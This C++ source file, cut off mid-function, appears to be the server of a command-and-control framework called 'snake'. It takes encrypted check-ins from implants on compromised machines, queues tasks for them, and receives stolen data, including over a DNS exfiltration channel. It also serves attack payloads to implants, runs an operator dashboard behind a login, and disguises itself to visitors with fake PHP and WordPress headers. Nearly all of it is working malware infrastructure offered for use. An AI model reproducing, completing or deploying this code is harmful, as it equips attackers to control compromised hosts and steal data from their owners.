#include "snake/api.hpp"

#include <dirent.h>
#include <dlfcn.h>
#include <openssl/evp.h>

#include <algorithm>
#include <cctype>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <mutex>
#include <optional>
#include <string>
#include <vector>

#include <nlohmann/json.hpp>

#include "snake/c2.hpp"
#include "snake/protocol.hpp"

namespace snake::api {

using nlohmann::ordered_json;

namespace {

int64_t now_ns() {
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
               std::chrono::system_clock::now().time_since_epoch())
        .count();
}

void civil_from_days(int64_t z, int* y, unsigned* m, unsigned* d) {
    z += 719468;
    const int64_t era = (z >= 0 ? z : z - 146096) / 146097;
    const unsigned doe = static_cast<unsigned>(z - era * 146097);
    const unsigned yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    const int64_t yy = static_cast<int64_t>(yoe) + era * 400;
    const unsigned doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    const unsigned mp = (5 * doy + 2) / 153;
    const unsigned dd = doy - (153 * mp + 2) / 5 + 1;
    const unsigned mm = mp < 10 ? mp + 3 : mp - 9;
    *y = static_cast<int>(yy + (mm <= 2));
    *m = mm;
    *d = dd;
}

std::string lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return s;
}

std::string go_escape_html_json(std::string s) {
    auto replace_all = [](std::string& str, const std::string& from, const std::string& to) {
        size_t pos = 0;
        while ((pos = str.find(from, pos)) != std::string::npos) {
            str.replace(pos, from.size(), to);
            pos += to.size();
        }
    };
    replace_all(s, "<", "\\u003c");
    replace_all(s, ">", "\\u003e");
    replace_all(s, "&", "\\u0026");
    return s;
}

std::string b64url_nopad(const uint8_t* data, size_t len) {
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    std::string out;
    size_t i = 0;
    while (i + 2 < len) {
        uint32_t v = (data[i] << 16) | (data[i + 1] << 8) | data[i + 2];
        out.push_back(tbl[(v >> 18) & 63]);
        out.push_back(tbl[(v >> 12) & 63]);
        out.push_back(tbl[(v >> 6) & 63]);
        out.push_back(tbl[v & 63]);
        i += 3;
    }
    if (len - i == 1) {
        uint32_t v = data[i] << 16;
        out.push_back(tbl[(v >> 18) & 63]);
        out.push_back(tbl[(v >> 12) & 63]);
    } else if (len - i == 2) {
        uint32_t v = (data[i] << 16) | (data[i + 1] << 8);
        out.push_back(tbl[(v >> 18) & 63]);
        out.push_back(tbl[(v >> 12) & 63]);
        out.push_back(tbl[(v >> 6) & 63]);
    }
    return out;
}

std::string b64url_nopad(const std::string& s) {
    return b64url_nopad(reinterpret_cast<const uint8_t*>(s.data()), s.size());
}

std::string b64url_nopad(const Bytes& b) {
    return b64url_nopad(b.data(), b.size());
}

Bytes hmac_sha256(const Bytes& key, const Bytes& msg) {
    Bytes out(32);
    size_t outlen = 0;
    EVP_MAC* mac = EVP_MAC_fetch(nullptr, "HMAC", nullptr);
    if (mac) {
        EVP_MAC_CTX* ctx = EVP_MAC_CTX_new(mac);
        OSSL_PARAM params[2];
        params[0] = OSSL_PARAM_construct_utf8_string("digest", const_cast<char*>("SHA256"), 0);
        params[1] = OSSL_PARAM_construct_end();
        if (ctx && EVP_MAC_init(ctx, key.data(), key.size(), params) == 1 &&
            EVP_MAC_update(ctx, msg.data(), msg.size()) == 1 &&
            EVP_MAC_final(ctx, out.data(), &outlen, out.size()) == 1) {
            out.resize(outlen);
        }
        if (ctx) EVP_MAC_CTX_free(ctx);
        EVP_MAC_free(mac);
    }
    return out;
}

std::string go_float(double v) {
    if (std::isnan(v) || std::isinf(v)) return "null";
    if (v == std::floor(v) && std::fabs(v) < 1e15) {
        char buf[32];
        std::snprintf(buf, sizeof(buf), "%lld", static_cast<long long>(v));
        return buf;
    }
    char buf[40];
    std::snprintf(buf, sizeof(buf), "%.17g", v);
    return buf;
}

std::string go_duration_string(int64_t ns) {
    if (ns < 0) ns = -ns;
    int64_t secs = (ns + 500000000LL) / 1000000000LL;
    if (secs == 0) return "0s";
    std::string out;
    int64_t h = secs / 3600;
    int64_t m = (secs % 3600) / 60;
    int64_t s = secs % 60;
    if (h) out += std::to_string(h) + "h";
    if (m || h) {
        if (m || h) out += std::to_string(m) + "m";
    }
    out += std::to_string(s) + "s";
    return out;
}

std::optional<Bytes> sha1(const Bytes& in) {
    Bytes out(20);
    unsigned int outlen = 0;
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    if (!ctx) return std::nullopt;
    bool ok = EVP_DigestInit_ex(ctx, EVP_sha1(), nullptr) == 1 &&
              EVP_DigestUpdate(ctx, in.data(), in.size()) == 1 &&
              EVP_DigestFinal_ex(ctx, out.data(), &outlen) == 1;
    EVP_MD_CTX_free(ctx);
    if (!ok || outlen != 20) return std::nullopt;
    return out;
}

std::optional<std::string> open_envelope(const Bytes& session_key, const std::string& body,
                                         std::string* err) {
    if (session_key.empty()) {
        if (err) *err = "no session key configured";
        return std::nullopt;
    }
    auto env = nlohmann::json::parse(body, nullptr, false);
    if (env.is_discarded() || !env.is_object() || !env.contains("data") || !env["data"].is_string()) {
        if (err) *err = "envelope";
        return std::nullopt;
    }
    auto raw = from_b64(env["data"].get<std::string>());
    if (!raw) {
        if (err) *err = "base64";
        return std::nullopt;
    }
    auto plain = aead_decrypt(session_key, *raw);
    if (!plain) {
        if (err) *err = "decrypt";
        return std::nullopt;
    }
    return std::string(plain->begin(), plain->end());
}

std::string seal_envelope(const Bytes& session_key, const std::string& payload_json) {
    Bytes blob = aead_encrypt(session_key, Bytes(payload_json.begin(), payload_json.end()));
    ordered_json j = ordered_json::object();
    j["data"] = to_b64(blob);
    return j.dump();
}

bool ws_read_message(http::Conn& c, Bytes* out, int* opcode, std::string* err) {
    out->clear();
    int data_opcode = 0;
    for (;;) {
        uint8_t hdr[2];
        if (!c.read_exact(hdr, 2)) {
            if (err) *err = "eof";
            return false;
        }
        bool fin = (hdr[0] & 0x80) != 0;
        int op = hdr[0] & 0x0f;
        bool masked = (hdr[1] & 0x80) != 0;
        uint64_t len = hdr[1] & 0x7f;
        if (len == 126) {
            uint8_t ext[2];
            if (!c.read_exact(ext, 2)) return false;
            len = (static_cast<uint64_t>(ext[0]) << 8) | ext[1];
        } else if (len == 127) {
            uint8_t ext[8];
            if (!c.read_exact(ext, 8)) return false;
            len = 0;
            for (int i = 0; i < 8; ++i) len = (len << 8) | ext[i];
        }
        if (len > 64ULL * 1024 * 1024) {
            if (err) *err = "frame too large";
            return false;
        }
        uint8_t mask[4] = {0, 0, 0, 0};
        if (masked && !c.read_exact(mask, 4)) return false;
        Bytes payload(static_cast<size_t>(len));
        if (len && !c.read_exact(payload.data(), static_cast<size_t>(len))) return false;
        if (masked) {
            for (size_t i = 0; i < payload.size(); ++i) payload[i] ^= mask[i % 4];
        }
        if (op == 0x8) {
            if (err) *err = "closed";
            return false;
        }
        if (op == 0x9) {
            Bytes pong;
            pong.push_back(0x8a);
            pong.push_back(static_cast<uint8_t>(payload.size() & 0x7f));
            pong.insert(pong.end(), payload.begin(), payload.end());
            c.write_all(pong);
            continue;
        }
        if (op == 0xa) continue;
        if (op != 0x0) data_opcode = op;
        out->insert(out->end(), payload.begin(), payload.end());
        if (fin) {
            *opcode = data_opcode;
            return true;
        }
    }
}

bool ws_send_binary(http::Conn& c, const Bytes& payload) {
    Bytes frame;
    frame.push_back(0x82);
    size_t n = payload.size();
    if (n < 126) {
        frame.push_back(static_cast<uint8_t>(n));
    } else if (n <= 0xffff) {
        frame.push_back(126);
        frame.push_back(static_cast<uint8_t>((n >> 8) & 0xff));
        frame.push_back(static_cast<uint8_t>(n & 0xff));
    } else {
        frame.push_back(127);
        for (int i = 7; i >= 0; --i) frame.push_back(static_cast<uint8_t>((n >> (8 * i)) & 0xff));
    }
    frame.insert(frame.end(), payload.begin(), payload.end());
    return c.write_all(frame);
}

std::string tasks_json_array(const std::vector<store::Task>& tasks) {
    ordered_json arr = ordered_json::array();
    for (const auto& t : tasks) {
        ordered_json j = ordered_json::object();
        j["id"] = t.id;
        j["type"] = t.type;
        j["payload"] = t.payload;
        j["ts"] = t.ts;
        if (t.ttl.has_value() && *t.ttl != 0) j["ttl"] = *t.ttl;
        arr.push_back(j);
    }
    return arr.dump();
}

}  // namespace

std::string rfc3339_nano(int64_t unix_nanos) {
    int64_t secs = unix_nanos / 1000000000LL;
    int64_t frac = unix_nanos % 1000000000LL;
    if (frac < 0) {
        frac += 1000000000LL;
        secs -= 1;
    }
    int64_t days = secs / 86400;
    int64_t rem = secs % 86400;
    if (rem < 0) {
        rem += 86400;
        days -= 1;
    }
    int y = 0;
    unsigned m = 0, d = 0;
    civil_from_days(days, &y, &m, &d);
    char buf[64];
    std::snprintf(buf, sizeof(buf), "%04d-%02u-%02uT%02lld:%02lld:%02lld", y, m, d,
                  static_cast<long long>(rem / 3600), static_cast<long long>((rem % 3600) / 60),
                  static_cast<long long>(rem % 60));
    std::string out(buf);
    if (frac != 0) {
        char fb[16];
        std::snprintf(fb, sizeof(fb), "%09lld", static_cast<long long>(frac));
        std::string f(fb);
        while (!f.empty() && f.back() == '0') f.pop_back();
        if (!f.empty()) out += "." + f;
    }
    out += "Z";
    return out;
}

std::string implant_to_json(const store::ImplantRecord& ir) {
    ordered_json j = ordered_json::object();
    j["id"] = ir.id;
    j["type"] = ir.impl_type;
    j["target_proc"] = ir.target_proc;
    j["hostname"] = ir.hostname;
    j["arch"] = ir.arch;
    j["first_seen"] = rfc3339_nano(ir.first_seen_ns);
    j["last_seen"] = rfc3339_nano(ir.last_seen_ns);
    j["beacon_count"] = ir.beacon_count;
    j["tasks_sent"] = ir.tasks_sent;
    j["tasks_done"] = ir.tasks_done;
    j["jitter_score"] = ordered_json::parse(go_float(ir.jitter_score));
    j["dns_enabled"] = ir.dns_enabled;
    j["mesh_enabled"] = ir.mesh_enabled;
    j["flagged"] = ir.flagged;
    if (!ir.node_id.empty()) j["node_id"] = ir.node_id;
    return go_escape_html_json(j.dump());
}

std::string mesh_node_to_json(const store::MeshNode& n) {
    ordered_json j = ordered_json::object();
    j["id"] = n.id;
    j["addr"] = n.addr;
    j["pubkey"] = nullptr;
    j["last_seen"] = rfc3339_nano(n.last_seen_ns);
    j["implants"] = n.implants;
    j["version"] = n.version;
    static_cast<void>(n.pubkey);
    return go_escape_html_json(j.dump());
}

std::string sign_operator_jwt(const Bytes& session_key, int64_t iat) {
    ordered_json header = ordered_json::object();
    header["alg"] = "HS256";
    header["typ"] = "JWT";
    ordered_json claims = ordered_json::object();
    claims["exp"] = iat + 24 * 3600;
    claims["iat"] = iat;
    claims["sub"] = "operator";
    std::string h = header.dump();
    std::string c = claims.dump();
    std::string signing_input = b64url_nopad(h) + "." + b64url_nopad(c);
    Bytes sig = hmac_sha256(session_key, Bytes(signing_input.begin(), signing_input.end()));
    return signing_input + "." + b64url_nopad(sig);
}

bool verify_operator_jwt(const Bytes& session_key, const std::string& token, std::string* claims,
                         int64_t* exp) {
    size_t d1 = token.find('.');
    if (d1 == std::string::npos) return false;
    size_t d2 = token.find('.', d1 + 1);
    if (d2 == std::string::npos) return false;
    std::string signing_input = token.substr(0, d2);
    Bytes sig = hmac_sha256(session_key, Bytes(signing_input.begin(), signing_input.end()));
    if (b64url_nopad(sig) != token.substr(d2 + 1)) return false;
    auto body = from_b64(token.substr(d1 + 1, d2 - d1 - 1) + "==");
    if (!body) return false;
    auto j = nlohmann::json::parse(std::string(body->begin(), body->end()), nullptr, false);
    if (j.is_discarded() || !j.is_object()) return false;
    if (claims) *claims = j.dump();
    if (exp) *exp = j.value("exp", static_cast<int64_t>(0));
    return true;
}

bool bcrypt_check(const std::string& hash, const std::string& password) {
    static void* handle = dlopen("libcrypt.so.1", RTLD_NOW);
    typedef char* (*crypt_fn)(const char*, const char*);
    static crypt_fn crypt_impl = handle ? reinterpret_cast<crypt_fn>(dlsym(handle, "crypt")) : nullptr;
    if (!crypt_impl) return false;
    static std::mutex m;
    std::lock_guard<std::mutex> lk(m);
    char* out = crypt_impl(password.c_str(), hash.c_str());
    if (!out) return false;
    std::string got(out);
    if (got.size() != hash.size()) return false;
    return constant_time_eq(Bytes(got.begin(), got.end()), Bytes(hash.begin(), hash.end()));
}

std::string ws_accept_key(const std::string& key) {
    static const char* kGuid = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    Bytes in(key.begin(), key.end());
    in.insert(in.end(), kGuid, kGuid + std::strlen(kGuid));
    auto digest = sha1(in);
    if (!digest) return std::string();
    return to_b64(*digest);
}

void http_error(http::Response& res, const std::string& msg, int code) {
    res.status = code;
    res.body = msg + "\n";
    res.set_header("Content-Type", "text/plain; charset=utf-8");
    res.set_header("X-Content-Type-Options", "nosniff");
}

void write_json(http::Response& res, const std::string& body) {
    res.status = 200;
    res.set_header("Content-Type", "application/json");
    res.body = body + "\n";
}

Server::Server(Config cfg) : cfg_(std::move(cfg)) {
    if (cfg_.payloads_dir.empty()) cfg_.payloads_dir = "payloads";
    auto seed = random_bytes(32);
    pub_key_ = ed25519_keypair_from_seed(seed).pub;
    start_time_ns_ = now_ns();
    register_routes();
    http_.set_handler([this](const http::Request& req, http::Response& res, http::Conn& conn) {
        route_request(req, res, &conn);
    });
}

Server::~Server() { stop(); }

void Server::register_routes() {
    auto add = [this](const std::string& pattern, bool auth,
                      void (Server::*fn)(const http::Request&, http::Response&, http::Conn*)) {
        Route r;
        r.pattern = pattern;
        r.auth = auth;
        r.exact = pattern.empty() || pattern.back() != '/';
        r.fn = fn;
        routes_.push_back(r);
    };
    add("/ws", false, &Server::handle_implant_ws);
    add("/api/v1/beacon", false, &Server::handle_implant_beacon);
    add("/api/v1/result", false, &Server::handle_implant_result);
    add("/dns/", false, &Server::handle_dns_receive);
    add("/api/dashboard/login", false, &Server::handle_dashboard_login);
    add("/api/dashboard/implants", true, &Server::handle_list_implants);
    add("/api/dashboard/implant/", true, &Server::handle_implant_detail);
    add("/api/dashboard/task", true, &Server::handle_create_task);
    add("/api/dashboard/tasks/", true, &Server::handle_implant_tasks);
    add("/api/dashboard/peers", true, &Server::handle_list_peers);
    add("/api/dashboard/config", true, &Server::handle_get_config);
    add("/api/dashboard/exfil/", true, &Server::handle_exfil_data);
    add("/api/v1/payloads/", false, &Server::handle_serve_payload);
    add("/api/dashboard/payloads", true, &Server::handle_list_payloads);
    add("/dashboard", true, &Server::handle_dashboard_ui);
    add("/", false, &Server::handle_catch_all);
}

const Server::Route* Server::match_route(const std::string& path) const {
    const Route* best = nullptr;
    for (const auto& r : routes_) {
        bool matches = r.exact ? path == r.pattern : path.compare(0, r.pattern.size(), r.pattern) == 0;
        if (!matches) continue;
        if (best == nullptr || r.pattern.size() > best->pattern.size()) best = &r;
    }
    return best;
}

bool Server::start(std::string* err) {
    const std::string cert = cfg_.tls_enabled ? cfg_.tls_cert : std::string();
    const std::string key = cfg_.tls_enabled ? cfg_.tls_key : std::string();
    if (!http_.listen(cfg_.listen, cert, key, err)) return false;
    running_ = true;
    runner_ = std::thread([this]() { http_.serve_forever(); });
    return true;
}

void Server::stop() {
    if (!running_.exchange(false)) return;
    http_.stop();
    if (runner_.joinable()) runner_.join();
}

size_t Server::dashboard_token_count() {
    std::lock_guard<std::mutex> lk(mu_);
    return dash_tokens_.size();
}

http::Response Server::handle(const http::Request& req, http::Conn* conn) {
    http::Response res;
    route_request(req, res, conn);
    return res;
}

void Server::route_request(const http::Request& req, http::Response& res, http::Conn* conn) {
    const Route* route = match_route(req.path);
    if (route == nullptr) {
        http_error(res, "404 page not found", 404);
        return;
    }
    if (route->auth && !authorized(req, res)) return;
    (this->*(route->fn))(req, res, conn);
}

bool Server::password_ok(const std::string& given) {
    if (cfg_.dashboard_pw.empty()) return false;
    if (cfg_.dashboard_pw.rfind("$2", 0) == 0) return bcrypt_check(cfg_.dashboard_pw, given);
    Bytes a(given.begin(), given.end());
    Bytes b(cfg_.dashboard_pw.begin(), cfg_.dashboard_pw.end());
    return constant_time_eq(a, b);
}

bool Server::authorized(const http::Request& req, http::Response& res) {
    std::string token = req.header("Authorization");
    if (token.empty()) {
        std::string cookie = req.header("Cookie");
        size_t pos = cookie.find("token=");
        if (pos != std::string::npos) {
            size_t end = cookie.find(';', pos);
            token = cookie.substr(pos + 6, end == std::string::npos ? std::string::npos : end - pos - 6);
        }
    } else if (token.rfind("Bearer ", 0) == 0) {
        token = token.substr(7);
    }

    if (token.empty()) {
        if (req.path.find("/dashboard") != std::string::npos && req.method == "GET") {
            res.status = 302;
            res.set_header("Location", "/");
            return false;
        }
        http_error(res, "unauthorized", 401);
        return false;
    }

    std::lock_guard<std::mutex> lk(mu_);
    auto it = dash_tokens_.find(token);
    if (it == dash_tokens_.end() || now_ns() / 1000000000LL > it->second) {
        http_error(res, "token expired", 401);
        return false;
    }
    return true;
}

void Server::handle_implant_ws(const http::Request& req, http::Response& res, http::Conn* conn) {
    if (conn == nullptr) {
        http_error(res, "upgrade: no connection", 500);
        return;
    }
    const std::string key = req.header("Sec-WebSocket-Key");
    if (lower(req.header("Upgrade")) != "websocket" || key.empty()) {
        http_error(res, "Bad Request", 400);
        return;
    }
    std::string head = "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n"
                       "Connection: Upgrade\r\nSec-WebSocket-Accept: " +
                       ws_accept_key(key) + "\r\n\r\n";
    if (!conn->write_all(head)) return;
    res.hijacked = true;

    Bytes msg;
    int opcode = 0;
    std::string err;
    if (!ws_read_message(*conn, &msg, &opcode, &err)) return;
    std::string body(msg.begin(), msg.end());
    auto decrypted = aead_decrypt(cfg_.session_key, Bytes(body.begin(), body.end()));
    if (!decrypted) {
        snake::c2::log_line("[ws] decrypt: " + std::string("aead"));
        return;
    }
    auto beacon = protocol::beacon_from_json(std::string(decrypted->begin(), decrypted->end()));
    if (!beacon || beacon->id.empty()) return;

    store::ImplantRecord ir;
    ir.id = beacon->id;
    ir.impl_type = beacon->type.empty() ? "windows" : beacon->type;
    ir.target_proc = beacon->target;
    ir.hostname = beacon->hostname.value_or("");
    ir.arch = beacon->arch.value_or("");
    ir.jitter_score = beacon->jitter;
    ir.first_seen_ns = now_ns();
    ir.last_seen_ns = ir.first_seen_ns;
    if (cfg_.store) {
        std::string serr;
        cfg_.store->upsert_implant(ir, &serr);
    }

    std::vector<store::Task> tasks;
    if (cfg_.store) {
        std::string serr;
        tasks = cfg_.store->pending_tasks(beacon->id, &serr);
    }
    std::string tasks_json = tasks.empty() ? std::string("null") : tasks_json_array(tasks);
    Bytes sealed = aead_encrypt(cfg_.session_key, Bytes(tasks_json.begin(), tasks_json.end()));
    if (!ws_send_binary(*conn, sealed)) return;

    for (;;) {
        Bytes m;
        int op = 0;
        std::string e;
        if (!ws_read_message(*conn, &m, &op, &e)) break;
        auto plain = aead_decrypt(cfg_.session_key, m);
        if (!plain) continue;
        auto result = protocol::task_result_from_json(std::string(plain->begin(), plain->end()));
        if (!result) continue;
        if (!result->task_id.empty() && cfg_.store) {
            std::string serr;
            cfg_.store->complete_task(result->task_id, *result, &serr);
        }
        ordered_json ack = ordered_json::object();
        ack["status"] = "ok";
        Bytes enc = aead_encrypt(cfg_.session_key, Bytes(ack.dump().begin(), ack.dump().end()));
        if (!ws_send_binary(*conn, enc)) break;
    }
}

void Server::handle_implant_beacon(const http::Request& req, http::Response& res, http::Conn*) {
    if (req.method != "POST") {
        http_error(res, "method not allowed", 405);
        return;
    }
    std::string oerr;
    auto plain = open_envelope(cfg_.session_key, req.body, &oerr);
    if (!plain) {
        http_error(res, "unauthorized", 401);
        return;
    }
    auto beacon = protocol::beacon_from_json(*plain);
    if (!beacon) {
        http_error(res, "bad request", 400);
        return;
    }
    if (beacon->id.empty()) {
        http_error(res, "missing id", 400);
        return;
    }
    store::ImplantRecord ir;
    ir.id = beacon->id;
    ir.impl_type = beacon->type.empty() ? "windows" : beacon->type;
    ir.target_proc = beacon->target;
    ir.hostname = beacon->hostname.value_or("");
    ir.arch = beacon->arch.value_or("");
    ir.jitter_score = beacon->jitter;
    ir.first_seen_ns = now_ns();
    ir.last_seen_ns = ir.first_seen_ns;
    if (cfg_.store) {
        std::string serr;
        cfg_.store->upsert_implant(ir, &serr);
    }
    std::vector<store::Task> tasks;
    if (cfg_.store) {
        std::string serr;
        tasks = cfg_.store->pending_tasks(beacon->id, &serr);
    }
    std::string tasks_json = tasks.empty() ? std::string("null") : tasks_json_array(tasks);
    res.status = 200;
    res.set_header("Content-Type", "application/json");
    res.body = seal_envelope(cfg_.session_key, tasks_json);
}

void Server::handle_implant_result(const http::Request& req, http::Response& res, http::Conn*) {
    if (req.method != "POST") {
        http_error(res, "method not allowed", 405);
        return;
    }
    std::string oerr;
    auto plain = open_envelope(cfg_.session_key, req.body, &oerr);
    if (!plain) {
        http_error(res, "unauthorized", 401);
        return;
    }
    auto result = protocol::task_result_from_json(*plain);
    if (!result) {
        http_error(res, "bad request", 400);
        return;
    }
    if (!result->task_id.empty() && cfg_.store) {
        std::string serr;
        cfg_.store->complete_task(result->task_id, *result, &serr);
    }
    ordered_json j = ordered_json::object();
    j["status"] = "ok";
    write_json(res, j.dump());
}

void Server::handle_dns_receive(const http::Request& req, http::Response& res, http::Conn*) {
    std::string rest = req.path.substr(std::string("/dns/").size());
    std::vector<std::string> parts;
    size_t start = 0;
    for (;;) {
        size_t slash = rest.find('/', start);
        parts.push_back(rest.substr(start, slash == std::string::npos ? std::string::npos : slash - start));
        if (slash == std::string::npos) break;
        start = slash + 1;
    }
    if (parts.size() < 2) {
        http_error(res, "bad request", 400);
        return;
    }
    if (cfg_.store) {
        std::string serr;
        cfg_.store->exfil_data(parts[0], parts[1], "dns", req.body, &serr);
    }
    ordered_json j = ordered_json::object();
    j["status"] = "ok";
    write_json(res, j.dump());
}

void Server::handle_dashboard_login(const http::Request& req, http::Response& res, http::Conn*) {
    if (req.method != "POST") {
        http_error(res, "method not allowed", 405);
        return;
    }
    auto creds = nlohmann::json::parse(req.body, nullptr, false);
    if (creds.is_discarded() || !creds.is_object()) {
        http_error(res, "bad request", 400);
        return;
    }
    std::string password = creds.value("password", std::string());
    if (!password_ok(password)) {
        http_error(res, "unauthorized", 401);
        return;
    }
    int64_t now = now_ns() / 1000000000LL;
    std::string token = sign_operator_jwt(cfg_.session_key, now);
    {
        std::lock_guard<std::mutex> lk(mu_);
        dash_tokens_[token] = now + 24 * 3600;
    }
    ordered_json j = ordered_json::object();
    j["token"] = token;
    write_json(res, j.dump());
}

void Server::handle_list_implants(const http::Request&, http::Response& res, http::Conn*) {
    std::vector<store::ImplantRecord> implants;
    std::string err;
    if (cfg_.store) implants = cfg_.store->list_implants(&err);
    if (!err.empty()) {
        http_error(res, err, 500);
        return;
    }
    ordered_json arr = ordered_json::array();
    for (const auto& ir : implants) {
        ordered_json e = ordered_json::parse(implant_to_json(ir));
        arr.push_back(std::move(e));
    }
    ordered_json j = ordered_json::object();
    j["count"] = static_cast<int>(implants.size());
    j["implants"] = arr;
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_implant_detail(const http::Request& req, http::Response& res, http::Conn*) {
    std::string id = req.path.substr(std::string("/api/dashboard/implant/").size());
    std::string err;
    std::optional<store::ImplantRecord> ir;
    if (cfg_.store) ir = cfg_.store->get_implant(id, &err);
    if (!ir) {
        http_error(res, "not found", 404);
        return;
    }
    ordered_json j = ordered_json::object();
    j["implant"] = ordered_json::parse(implant_to_json(*ir));
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_create_task(const http::Request& req, http::Response& res, http::Conn*) {
    if (req.method != "POST") {
        http_error(res, "method not allowed", 405);
        return;
    }
    auto body = nlohmann::json::parse(req.body, nullptr, false);
    if (body.is_discarded() || !body.is_object()) {
        http_error(res, "bad request", 400);
        return;
    }
    std::string implant_id = body.value("implant_id", std::string());
    std::string type = body.value("type", std::string());
    std::string channel = body.value("channel", std::string());
    if (channel.empty()) channel = "primary";
    nlohmann::json payload = nlohmann::json(nullptr);
    if (body.contains("payload") && !body["payload"].is_null()) payload = body["payload"];

    std::string err;
    std::optional<store::Task> task;
    if (cfg_.store) task = cfg_.store->create_task(implant_id, type, channel, payload, &err);
    if (!task) {
        http_error(res, err.empty() ? "task create failed" : err, 500);
        return;
    }
    ordered_json j = ordered_json::object();
    j["success"] = true;
    j["task_id"] = task->id;
    write_json(res, j.dump());
}

void Server::handle_implant_tasks(const http::Request& req, http::Response& res, http::Conn*) {
    std::string id = req.path.substr(std::string("/api/dashboard/tasks/").size());
    std::vector<store::Task> tasks;
    std::string err;
    if (cfg_.store) tasks = cfg_.store->pending_tasks(id, &err);
    if (!err.empty()) {
        http_error(res, err, 500);
        return;
    }
    ordered_json j = ordered_json::object();
    j["success"] = true;
    j["tasks"] = ordered_json::parse(tasks_json_array(tasks));
    write_json(res, j.dump());
}

void Server::handle_list_peers(const http::Request&, http::Response& res, http::Conn*) {
    std::vector<store::MeshNode> peers;
    std::string err;
    if (cfg_.store) peers = cfg_.store->list_mesh_nodes(&err);
    if (!err.empty()) {
        http_error(res, err, 500);
        return;
    }
    ordered_json arr = ordered_json::array();
    for (const auto& n : peers) {
        ordered_json e = ordered_json::parse(mesh_node_to_json(n));
        arr.push_back(std::move(e));
    }
    ordered_json j = ordered_json::object();
    j["peers"] = arr;
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_get_config(const http::Request&, http::Response& res, http::Conn*) {
    int count = 0;
    std::vector<store::MeshNode> peers;
    if (cfg_.store) {
        std::string err;
        count = cfg_.store->implant_count(&err);
        peers = cfg_.store->list_mesh_nodes(&err);
    }
    ordered_json cfg = ordered_json::object();
    cfg["version"] = "3.0.0";
    cfg["c2_id"] = cfg_.c2_id;
    cfg["implants"] = count;
    cfg["peers"] = static_cast<int>(peers.size());
    cfg["uptime"] = go_duration_string(now_ns() - start_time_ns_);
    ordered_json j = ordered_json::object();
    j["config"] = cfg;
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_exfil_data(const http::Request& req, http::Response& res, http::Conn*) {
    std::string rest = req.path.substr(std::string("/api/dashboard/exfil/").size());
    size_t slash = rest.find('/');
    std::string first = slash == std::string::npos ? rest : rest.substr(0, slash);
    if (first.empty()) {
        http_error(res, "missing implant id", 400);
        return;
    }
    ordered_json j = ordered_json::object();
    j["implant"] = first;
    j["message"] = "exfil data endpoint active";
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_serve_payload(const http::Request& req, http::Response& res, http::Conn*) {
    std::string name = req.path.substr(std::string("/api/v1/payloads/").size());
    if (name.empty() || name.find("..") != std::string::npos) {
        http_error(res, "invalid payload", 400);
        return;
    }
    std::string path = cfg_.payloads_dir + "/" + name;
    std::FILE* f = std::fopen(path.c_str(), "rb");
    if (f == nullptr) {
        http_error(res, "payload not found", 404);
        return;
    }
    std::string data;
    char buf[65536];
    size_t n = 0;
    while ((n = std::fread(buf, 1, sizeof(buf), f)) > 0) data.append(buf, n);
    std::fclose(f);
    res.status = 200;
    res.set_header("Content-Type", "application/octet-stream");
    res.set_header("X-Payload-Version", "3.0.0");
    res.set_header("Accept-Ranges", "bytes");
    res.body = data;
}

void Server::handle_list_payloads(const http::Request&, http::Response& res, http::Conn*) {
    ordered_json entries = ordered_json::array();
    std::string manifest_path = cfg_.payloads_dir + "/manifest.json";
    std::FILE* f = std::fopen(manifest_path.c_str(), "rb");
    if (f != nullptr) {
        std::string data;
        char buf[65536];
        size_t n = 0;
        while ((n = std::fread(buf, 1, sizeof(buf), f)) > 0) data.append(buf, n);
        std::fclose(f);
        auto manifest = nlohmann::json::parse(data, nullptr, false);
        if (manifest.is_discarded() || !manifest.is_object()) {
            http_error(res, "invalid manifest", 500);
            return;
        }
        if (manifest.contains("payloads") && manifest["payloads"].is_array()) {
            for (const auto& p : manifest["payloads"]) {
                ordered_json e = ordered_json::object();
                e["name"] = p.value("name", std::string());
                e["file"] = p.value("file", std::string());
                e["category"] = p.value("category", std::string());
                e["desc"] = p.value("desc", std::string());
                e["platform"] = p.value("platform", std::string());
                e["args"] = p.value("args", std::string());
                entries.push_back(e);
            }
        }
    } else {
        DIR* d = ::opendir(cfg_.payloads_dir.c_str());
        if (d != nullptr) {
            std::vector<std::string> names;
            while (dirent* de = ::readdir(d)) {
                std::string name = de->d_name;
                if (name.size() > 3 && name.compare(name.size() - 3, 3, ".py") == 0) {
                    names.push_back(name);
                }
            }
            ::closedir(d);
            std::sort(names.begin(), names.end());
            for (const auto& n : names) {
                ordered_json e = ordered_json::object();
                e["name"] = n.substr(0, n.size() - 3);
                e["file"] = n;
                e["category"] = "general";
                e["desc"] = "Python payload module";
                e["platform"] = "all";
                e["args"] = "";
                entries.push_back(e);
            }
        }
    }
    ordered_json j = ordered_json::object();
    j["payloads"] = entries;
    j["success"] = true;
    write_json(res, go_escape_html_json(j.dump()));
}

void Server::handle_dashboard_ui(const http::Request&, http::Response& res, http::Conn*) {
    res.status = 200;
    res.set_header("Content-Type", "text/html; charset=utf-8");
    res.body = cfg_.dashboard_html.empty() ? embedded_dashboard_html() : cfg_.dashboard_html;
}

void Server::handle_catch_all(const http::Request& req, http::Response& res, http::Conn*) {
    res.set_header("Content-Type", "text/html; charset=utf-8");
    res.set_header("X-Powered-By", "PHP/7.4.33");
    res.set_header("X-Generator", "WordPress 6.4.2");
    std::string path = http::html_escape(req.path);
    bool wp = path.size() >= 4 && path.compare(path.size() - 4, 4, ".php") == 0;
    if (!wp) wp = !path.empty() && path.back() == '/';
    if (wp) {
        res.status = 200;
